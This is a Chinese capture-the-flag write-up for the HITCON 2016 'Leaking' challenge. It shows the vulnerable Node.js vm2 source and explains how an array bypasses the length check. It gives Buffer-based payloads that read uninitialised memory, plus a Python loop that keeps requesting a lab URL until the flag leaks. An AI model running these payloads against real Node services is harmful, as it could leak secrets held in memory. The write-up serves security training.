# \[HITCON 2016]Leaking

## \[HITCON 2016]Leaking

## 考点

* Node.js 审计
* vm2沙盒逃逸

## wp

```javascript
"use strict";

var randomstring = require("randomstring");
var express = require("express");
var {
    VM
} = require("vm2");
var fs = require("fs");

var app = express();
var flag = require("./config.js").flag

app.get("/", function(req, res) {
    res.header("Content-Type", "text/plain");

    /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */
    eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";")
    if (req.query.data && req.query.data.length <= 12) {
        var vm = new VM({
            timeout: 1000
        });
        console.log(req.query.data);
        res.send("eval ->" + vm.run(req.query.data));
    } else {
        res.send(fs.readFileSync(__filename).toString());
    }
});

app.listen(3000, function() {
    console.log("listening on port 3000!");
});
```

题目代码大概在说这么一件事

首先引入一些需要的模块，其中值得注意的是vm2模块，它是一个Node.js官方vm模块的替代品，用来创建一个干净的上下文环境。使用官方的vm库构建沙箱环境。然后使用JavaScript的Proxy技术来防止沙箱脚本逃逸。更多的资料可以看这里[https://segmentfault.com/a/1190000012672620](https://segmentfault.com/a/1190000012672620)

然后要Get传递一个`data`参数，将它放在vm2创建的沙盒中运行，并且对传入的参数长度进行了限制，不超过`12`，这里可以用数组绕过。

下面的问题就是如何逃逸

> 在较早一点的 node 版本中 (8.0 之前)，当 `Buffer` 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 `Buffer.allocUnsafe(size)` 来获得未清空的内存。
>
> 低版本的node可以使用`buffer()`来查看内存，只要调用过的变量，都会存在内存中，那么我们可以构造paylaod读取内存
>
> [https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md](https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md)

payload 1（失败）

```
?data[]=for (var step = 0; step < 100000; step++) {var buf = (new Buffer(100)).toString('ascii');if (buf.indexOf("hitcon{") !== -1) {break;}}buf;
```

payload 2

```
?data=Buffer(800)
```

脚本

```python
import requests

url = 'http://7e08fc0a-3009-4eb3-84d3-2a32b1dfa645.node3.buuoj.cn/?data=Buffer(800)'

while True:
    res = requests.get(url)
    print(res.status_code)

    if 'hitcon{' in res.text:
        print(res.text)
        break
```

## 小结

1. 关于Node.js中的Buffer(缓冲区)，是用来创建一个专门存放二进制数据的缓存区，见[Node.js Buffer(缓冲区)](https://www.runoob.com/nodejs/nodejs-buffer.html)

